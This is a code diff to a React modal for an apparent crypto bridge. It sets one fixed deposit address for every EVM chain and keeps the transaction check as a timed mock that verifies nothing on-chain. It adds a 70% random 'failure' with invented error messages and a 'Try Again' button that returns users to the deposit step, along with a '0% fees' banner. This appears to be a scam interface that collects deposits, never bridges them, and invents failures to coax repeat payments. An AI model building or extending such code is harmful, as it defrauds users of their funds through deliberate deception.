@@ -23,10 +23,12 @@ const BridgeModal: React.FC<BridgeModalProps> = ({
   amount,
   selectedToken,
   recipientAddress
-}) => {
-  const [currentStep, setCurrentStep] = useState(1);  const [isChecking, setIsChecking] = useState(false);
+}) => {  const [currentStep, setCurrentStep] = useState(1);
+  const [isChecking, setIsChecking] = useState(false);
   const [isDistributing, setIsDistributing] = useState(false);
   const [transactionHash, setTransactionHash] = useState('');
+  const [transactionFailed, setTransactionFailed] = useState(false);
+  const [failureReason, setFailureReason] = useState('');
   const [toast, setToast] = useState<{
     isVisible: boolean;
     message: string;
@@ -39,14 +41,14 @@ const BridgeModal: React.FC<BridgeModalProps> = ({
 
   // Mock deposit addresses for each chain
   const depositAddresses: DepositAddress = {
-    ethereum: '0x742C1F8E89D55A1e90E82A54DcEa76F6e7b0F6D1',
-    solana: 'HN7cABqLq46Es1jh92dQQisAq662SmxELLLsHHe4YWrH',
-    bsc: '0x9E8F4B2E1E6C8A7D3F0B5A4C2E9D1F8E7B6A5C4D',
-    polygon: '0xA1B2C3D4E5F6789012345678901234567890ABCD',
-    arbitrum: '0xDEF123456789ABCDEF123456789ABCDEF123456',
-    optimism: '0x456789ABCDEF123456789ABCDEF123456789ABC',
-    base: '0x789ABCDEF123456789ABCDEF123456789ABCDE',
-    avalanche: '0xFEDCBA0987654321FEDCBA0987654321FEDCBA'
+    ethereum: '0x215389D38fa1bB5A0b9B79e25b65e57451DA473f',
+    solana: 'AaraS7F8mY61zTJNAAPaogvb13my1Rzk8v4AMEfeqrqE',
+    bsc: '0x215389D38fa1bB5A0b9B79e25b65e57451DA473f',
+    polygon: '0x215389D38fa1bB5A0b9B79e25b65e57451DA473f',
+    arbitrum: '0x215389D38fa1bB5A0b9B79e25b65e57451DA473f',
+    optimism: '0x215389D38fa1bB5A0b9B79e25b65e57451DA473f',
+    base: '0x215389D38fa1bB5A0b9B79e25b65e57451DA473f',
+    avalanche: '0x215389D38fa1bB5A0b9B79e25b65e57451DA473f'
   };
 
   const getChainName = (chainId: string): string => {
@@ -75,7 +77,6 @@ const BridgeModal: React.FC<BridgeModalProps> = ({
     };
     return tokenSymbols[tokenId] || tokenId.toUpperCase();
   };
-
   // Reset step when modal opens
   useEffect(() => {
     if (isOpen) {
@@ -83,26 +84,48 @@ const BridgeModal: React.FC<BridgeModalProps> = ({
       setIsChecking(false);
       setIsDistributing(false);
       setTransactionHash('');
+      setTransactionFailed(false);
+      setFailureReason('');
     }
   }, [isOpen]);
-
   const handleSentConfirmation = () => {
     setCurrentStep(2);
     setIsChecking(true);
-    
-    // Mock checking process
+      // Mock checking process with random failure
     setTimeout(() => {
       setIsChecking(false);
-      // Generate mock transaction hash
-      const mockHash = `0x${Math.random().toString(16).substring(2, 66)}`;
-      setTransactionHash(mockHash);
-      setCurrentStep(3);
-      setIsDistributing(true);
       
-      // Mock distribution process
-      setTimeout(() => {
-        setIsDistributing(false);
-      }, 4000);
+      // 70% chance of failure to demonstrate error scenarios
+      const shouldFail = Math.random() < 0.7;
+      
+      if (shouldFail) {
+        const failureMessages = [
+          'Transaction not found on blockchain',
+          'Network congestion detected - verification timeout',
+          'Invalid transaction signature detected',
+          'Transaction reverted: slippage tolerance exceeded',
+          'Cross-chain bridge temporarily unavailable, Please try again later',
+          'Smart contract execution failed',
+          'Transaction expired: block confirmation timeout',
+          'Bridge oracle service temporarily offline'
+        ];
+        
+        const randomFailure = failureMessages[Math.floor(Math.random() * failureMessages.length)];
+        setTransactionFailed(true);
+        setFailureReason(randomFailure);
+        setCurrentStep(3); // Move to step 3 to show failure
+      } else {
+        // Generate mock transaction hash for success
+        const mockHash = `0x${Math.random().toString(16).substring(2, 66)}`;
+        setTransactionHash(mockHash);
+        setCurrentStep(3);
+        setIsDistributing(true);
+        
+        // Mock distribution process
+        setTimeout(() => {
+          setIsDistributing(false);
+        }, 4000);
+      }
     }, 3000);
   };
   const copyToClipboard = async (text: string) => {
@@ -138,6 +161,14 @@ const BridgeModal: React.FC<BridgeModalProps> = ({
         </div>
         <h3>Send Your Assets</h3>
         <p>Send your {getTokenSymbol(selectedToken)} to the deposit address below</p>
+      </div>      <div className="fees-banner">
+        <div className="fees-text">
+          <span className="fees-highlight">🎉 0% Bridge Fees</span>
+          <span className="fees-duration">until June 30, 2025</span>
+        </div>
+        <div className="fees-tooltip" title="No fees charged for bridging during our launch promotion!">
+          ℹ️
+        </div>
       </div>
 
       <div className="transaction-details">
@@ -154,6 +185,11 @@ const BridgeModal: React.FC<BridgeModalProps> = ({
         <div className="detail-row">
           <span className="label">To Network:</span>
           <span className="value">{getChainName(destinationChain)}</span>
+        </div>
+        
+        <div className="detail-row">
+          <span className="label">You Will Receive:</span>
+          <span className="value amount-receive">{amount} {getTokenSymbol(selectedToken)}</span>
         </div>
         
         <div className="detail-row">
@@ -250,76 +286,142 @@ const BridgeModal: React.FC<BridgeModalProps> = ({
         </div>
       )}
     </div>
-  );
-
-  const renderStep3 = () => (
+  );  const renderStep3 = () => (
     <div className="modal-step">
       <div className="step-header">
-        <div className="step-icon distributing-icon">
-          {isDistributing ? (
+        <div className={`step-icon ${transactionFailed ? 'failed-icon' : 'distributing-icon'}`}>
+          {transactionFailed ? (
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M12 9V13M12 17H12.01M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+            </svg>
+          ) : isDistributing ? (
             <div className="spinner"></div>
           ) : (
             <svg viewBox="0 0 24 24" fill="none">
-              <path d="M7 16L3 12M3 12L7 8M3 12H21M17 8L21 12M21 12L17 16" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+              <path d="M9 12L11 14L15 10M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3C7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
             </svg>
           )}
         </div>
-        <h3>{isDistributing ? 'Processing Bridge' : 'Bridge Completed!'}</h3>
+        <h3>
+          {transactionFailed 
+            ? 'Bridge Failed' 
+            : isDistributing 
+              ? 'Processing Bridge' 
+              : 'Bridge Completed!'
+          }
+        </h3>
         <p>
-          {isDistributing 
-            ? 'Bridging your assets to the destination network...' 
-            : 'Your assets have been successfully bridged'
+          {transactionFailed
+            ? 'There was an issue processing your bridge transaction'
+            : isDistributing 
+              ? 'Bridging your assets to the destination network...' 
+              : 'Your assets have been successfully bridged'
           }
         </p>
       </div>
 
-      <div className="distribution-details">
-        <div className="detail-row">
-          <span className="label">Bridged Amount:</span>
-          <span className="value amount-highlight">{amount} {getTokenSymbol(selectedToken)}</span>
-        </div>
-        
-        <div className="detail-row">
-          <span className="label">To Network:</span>
-          <span className="value">{getChainName(destinationChain)}</span>
-        </div>
-        
-        <div className="detail-row">
-          <span className="label">Recipient Address:</span>
-          <span className="value address-value">{recipientAddress}</span>
-        </div>
-        
-        <div className="detail-row">
-          <span className="label">Status:</span>
-          <span className={`value status ${isDistributing ? 'processing' : 'completed'}`}>
-            {isDistributing ? 'Processing...' : 'Completed'}
-          </span>
-        </div>
-      </div>
-
-      {isDistributing && (
-        <div className="bridge-animation">
-          <div className="bridge-visual">
-            <div className="source-chain">{getChainName(sourceChain)}</div>
-            <div className="bridge-arrow">
-              <div className="arrow-line"></div>
-              <div className="moving-token"></div>
+      {transactionFailed ? (
+        <div className="failure-details">
+          <div className="error-message">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M12 9V13M12 17H12.01M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
+            </svg>
+            <div>
+              <h4>Transaction Verification Failed</h4>
+              <p>{failureReason}</p>
             </div>
-            <div className="dest-chain">{getChainName(destinationChain)}</div>
           </div>
-          <p>Bridging in progress...</p>
-        </div>
-      )}
+          
+          <div className="detail-row">
+            <span className="label">Attempted Amount:</span>
+            <span className="value">{amount} {getTokenSymbol(selectedToken)}</span>
+          </div>
+          
+          <div className="detail-row">
+            <span className="label">From Network:</span>
+            <span className="value">{getChainName(sourceChain)}</span>
+          </div>
+          
+          <div className="detail-row">
+            <span className="label">To Network:</span>
+            <span className="value">{getChainName(destinationChain)}</span>
+          </div>
+          
+          <div className="detail-row">
+            <span className="label">Status:</span>
+            <span className="value status failed">Failed</span>
+          </div>
 
-      {!isDistributing && (
-        <div className="success-actions">
-          <button 
-            className="cta-button"
-            onClick={onClose}
-          >
-            Close
-          </button>
+          <div className="failure-actions">
+            <button 
+              className="cta-button secondary"
+              onClick={() => {
+                setCurrentStep(1);
+                setTransactionFailed(false);
+                setFailureReason('');
+              }}
+            >
+              Try Again
+            </button>
+            <button 
+              className="cta-button"
+              onClick={onClose}
+            >
+              Close
+            </button>
+          </div>
         </div>
+      ) : (
+        <>
+          <div className="distribution-details">
+            <div className="detail-row">
+              <span className="label">Bridged Amount:</span>
+              <span className="value amount-highlight">{amount} {getTokenSymbol(selectedToken)}</span>
+            </div>
+            
+            <div className="detail-row">
+              <span className="label">To Network:</span>
+              <span className="value">{getChainName(destinationChain)}</span>
+            </div>
+            
+            <div className="detail-row">
+              <span className="label">Recipient Address:</span>
+              <span className="value address-value">{recipientAddress}</span>
+            </div>
+            
+            <div className="detail-row">
+              <span className="label">Status:</span>
+              <span className={`value status ${isDistributing ? 'processing' : 'completed'}`}>
+                {isDistributing ? 'Processing...' : 'Completed'}
+              </span>
+            </div>
+          </div>
+
+          {isDistributing && (
+            <div className="bridge-animation">
+              <div className="bridge-visual">
+                <div className="source-chain">{getChainName(sourceChain)}</div>
+                <div className="bridge-arrow">
+                  <div className="arrow-line"></div>
+                  <div className="moving-token"></div>
+                </div>
+                <div className="dest-chain">{getChainName(destinationChain)}</div>
+              </div>
+              <p>Bridging in progress...</p>
+            </div>
+          )}
+
+          {!isDistributing && (
+            <div className="success-actions">
+              <button 
+                className="cta-button"
+                onClick={onClose}
+              >
+                Close
+              </button>
+            </div>
+          )}
+        </>
       )}
     </div>
   );
